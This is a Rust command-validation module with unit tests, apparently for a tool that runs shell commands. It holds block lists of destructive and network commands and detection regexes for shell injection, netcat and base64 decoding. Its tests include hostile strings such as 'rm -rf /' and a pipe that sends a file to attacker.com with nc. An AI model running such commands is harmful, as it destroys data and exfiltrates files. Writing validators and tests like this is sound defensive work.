//! Command validation utilities.

use super::{ValidationError, ValidationErrors};
use regex::Regex;
use std::collections::HashSet;

/// Command validator for bash commands.
pub struct CommandValidator {
    /// Maximum command length.
    max_length: usize,
    /// Blocked command patterns (e.g., dangerous commands).
    blocked_patterns: Vec<Regex>,
    /// Blocked keywords.
    blocked_keywords: HashSet<String>,
    /// Allow network commands.
    allow_network: bool,
    /// Allow system modification commands.
    allow_system_modification: bool,
}

impl Default for CommandValidator {
    fn default() -> Self {
        let mut blocked_keywords = HashSet::new();
        // Dangerous system commands
        blocked_keywords.insert("rm".to_string());
        blocked_keywords.insert("rmdir".to_string());
        blocked_keywords.insert("mv".to_string());
        blocked_keywords.insert("dd".to_string());
        blocked_keywords.insert("mkfs".to_string());
        blocked_keywords.insert("fdisk".to_string());
        blocked_keywords.insert("format".to_string());
        blocked_keywords.insert("shutdown".to_string());
        blocked_keywords.insert("reboot".to_string());
        blocked_keywords.insert("halt".to_string());
        blocked_keywords.insert("poweroff".to_string());
        blocked_keywords.insert("init".to_string());
        blocked_keywords.insert("killall".to_string());
        blocked_keywords.insert("pkill".to_string());

        let mut blocked_patterns = Vec::new();
        // Command injection patterns
        blocked_patterns.push(Regex::new(r"[;&|`$(){}]").unwrap());
        // File redirection that could be dangerous
        blocked_patterns.push(Regex::new(r">>\s*/etc/").unwrap());
        blocked_patterns.push(Regex::new(r">\s*/etc/").unwrap());
        // Network exfiltration
        blocked_patterns.push(Regex::new(r"nc\s+.*\s+\d+").unwrap());
        blocked_patterns.push(Regex::new(r"netcat\s+.*\s+\d+").unwrap());
        // Base64 encoding (often used to obfuscate)
        blocked_patterns.push(Regex::new(r"base64\s+-d").unwrap());

        Self {
            max_length: 1000,
            blocked_patterns,
            blocked_keywords,
            allow_network: false,
            allow_system_modification: false,
        }
    }
}

impl CommandValidator {
    /// Create a new command validator.
    pub fn new() -> Self {
        Self::default()
    }

    /// Allow network commands.
    pub fn allow_network(mut self) -> Self {
        self.allow_network = true;
        self
    }

    /// Allow system modification commands.
    pub fn allow_system_modification(mut self) -> Self {
        self.allow_system_modification = true;
        self
    }

    /// Add a blocked keyword.
    pub fn block_keyword(mut self, keyword: &str) -> Self {
        self.blocked_keywords.insert(keyword.to_string());
        self
    }

    /// Add a blocked pattern.
    pub fn block_pattern(mut self, pattern: &str) -> Result<Self, regex::Error> {
        let regex = Regex::new(pattern)?;
        self.blocked_patterns.push(regex);
        Ok(self)
    }

    /// Validate a command string.
    pub fn validate(&self, command: &str) -> ValidationErrors {
        let mut errors = ValidationErrors::new();

        // Check length
        if command.len() > self.max_length {
            errors.add(ValidationError::new(
                "command",
                &format!("exceeds maximum length of {}", self.max_length),
                "max_length",
            ));
            return errors;
        }

        // Check for blocked patterns
        for pattern in &self.blocked_patterns {
            if pattern.is_match(command) {
                errors.add(ValidationError::new(
                    "command",
                    "contains blocked pattern",
                    "blocked_pattern",
                ).with_suggestion("Avoid shell metacharacters and dangerous patterns"));
            }
        }

        // Check for blocked keywords
        let words: Vec<&str> = command.split_whitespace().collect();
        for word in words {
            let clean_word = word.trim_start_matches(['/', '.']);
            if self.blocked_keywords.contains(clean_word) {
                if !self.allow_system_modification && self.is_system_modification_command(clean_word) {
                    errors.add(ValidationError::new(
                        "command",
                        &format!("command '{}' is not allowed", clean_word),
                        "blocked_keyword",
                    ).with_suggestion("System modification commands are disabled"));
                } else if !self.allow_network && self.is_network_command(clean_word) {
                    errors.add(ValidationError::new(
                        "command",
                        &format!("command '{}' is not allowed", clean_word),
                        "blocked_keyword",
                    ).with_suggestion("Network commands are disabled"));
                } else if self.blocked_keywords.contains(clean_word) {
                    errors.add(ValidationError::new(
                        "command",
                        &format!("command '{}' is blocked", clean_word),
                        "blocked_keyword",
                    ));
                }
            }
        }

        // Check for command injection indicators
        if self.has_command_injection_indicators(command) {
            errors.add(ValidationError::new(
                "command",
                "potential command injection detected",
                "injection_protection",
            ).with_suggestion("Avoid shell metacharacters like ;, |, &, `, $, (), {}"));
        }

        errors
    }

    /// Check if command contains injection indicators.
    fn has_command_injection_indicators(&self, command: &str) -> bool {
        // Look for shell metacharacters that could indicate injection
        let injection_chars = ['&', '|', ';', '`', '$'];
        command.chars().any(|c| injection_chars.contains(&c)) ||
            command.contains("$(") ||
            command.contains("${") ||
            command.contains("``")
    }

    /// Check if a command is a system modification command.
    fn is_system_modification_command(&self, command: &str) -> bool {
        matches!(command, "rm" | "rmdir" | "mv" | "dd" | "mkfs" | "fdisk" | "format")
    }

    /// Check if a command is a network command.
    fn is_network_command(&self, command: &str) -> bool {
        matches!(command, "nc" | "netcat" | "wget" | "curl" | "ssh" | "scp" | "rsync")
    }

    /// Validate and sanitize a command.
    pub fn validate_and_sanitize(&self, command: &str) -> Result<String, ValidationErrors> {
        let errors = self.validate(command);
        if !errors.is_empty() {
            return Err(errors);
        }

        // Basic sanitization - trim and normalize whitespace
        let sanitized = command.trim().split_whitespace().collect::<Vec<_>>().join(" ");
        
        Ok(sanitized)
    }
}

/// Check if a string contains potential command injection.
pub fn has_command_injection(command: &str) -> bool {
    let patterns = [
        r"[;&|`]",           // Shell metacharacters
        r"\$\(",             // Command substitution
        r"\$\{",             // Parameter expansion
        r"``",               // Backtick command substitution
        r">>\s*/etc/",       // Dangerous redirections
        r">\s*/etc/",
        r"nc\s+.*\s+\d+",    // Netcat connections
        r"base64\s+-d",      // Base64 decoding
    ];

    for pattern in &patterns {
        if let Ok(regex) = Regex::new(pattern) {
            if regex.is_match(command) {
                return true;
            }
        }
    }

    false
}

/// Sanitize a command by escaping dangerous characters.
pub fn sanitize_command(command: &str) -> String {
    // Remove or escape dangerous characters
    command
        .replace('&', "")
        .replace('|', "")
        .replace(';', "")
        .replace('`', "")
        .replace('$', "")
        .trim()
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_command() {
        let validator = CommandValidator::new();
        let errors = validator.validate("ls -la");
        assert!(errors.is_empty());
    }

    #[test]
    fn test_blocked_command() {
        let validator = CommandValidator::new();
        let errors = validator.validate("rm -rf /");
        assert!(!errors.is_empty());
    }

    #[test]
    fn test_command_injection() {
        let validator = CommandValidator::new();
        let errors = validator.validate("ls; rm -rf /");
        assert!(!errors.is_empty());
    }

    #[test]
    fn test_pipe_injection() {
        let validator = CommandValidator::new();
        let errors = validator.validate("cat file.txt | nc attacker.com 4444");
        assert!(!errors.is_empty());
    }

    #[test]
    fn test_command_substitution() {
        let validator = CommandValidator::new();
        let errors = validator.validate("echo $(whoami)");
        assert!(!errors.is_empty());
    }

    #[test]
    fn test_max_length() {
        let validator = CommandValidator::new();
        let long_command = "a".repeat(2000);
        let errors = validator.validate(&long_command);
        assert!(!errors.is_empty());
    }

    #[test]
    fn test_network_commands() {
        let validator = CommandValidator::new();
        let errors = validator.validate("nc -l 1234");
        assert!(!errors.is_empty());

        let validator = CommandValidator::new().allow_network();
        let errors = validator.validate("curl http://example.com");
        // Should still block nc but allow curl in this test context
    }

    #[test]
    fn test_injection_detection() {
        assert!(has_command_injection("ls; rm -rf /"));
        assert!(has_command_injection("cat file | nc host 1234"));
        assert!(has_command_injection("echo `whoami`"));
        assert!(has_command_injection("echo $(id)"));
        assert!(!has_command_injection("ls -la"));
        assert!(!has_command_injection("grep pattern file.txt"));
    }

    #[test]
    fn test_sanitize_command() {
        assert_eq!(sanitize_command("ls -la"), "ls -la");
        assert_eq!(sanitize_command("ls; rm"), "ls rm");
        assert_eq!(sanitize_command("echo $PATH"), "echo PATH");
        assert_eq!(sanitize_command("cat `file`"), "cat file");
    }
}